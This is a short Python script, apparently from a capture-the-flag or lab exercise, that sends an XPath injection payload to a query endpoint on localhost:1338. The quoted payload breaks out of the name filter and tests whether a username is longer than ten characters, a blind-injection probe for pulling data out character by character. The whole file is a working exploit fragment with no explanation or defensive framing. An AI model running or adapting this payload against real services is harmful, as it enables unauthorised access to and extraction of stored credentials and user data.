import requests
from urllib.parse import quote
if __name__ == "__main__":
    url = 'http://localhost:1338/query?name='
    payload = quote("' or '1'='1'][string-length(username) > 10 and '1'='1")
    url += payload
    res = requests.get(url=url)
    print(res.text)
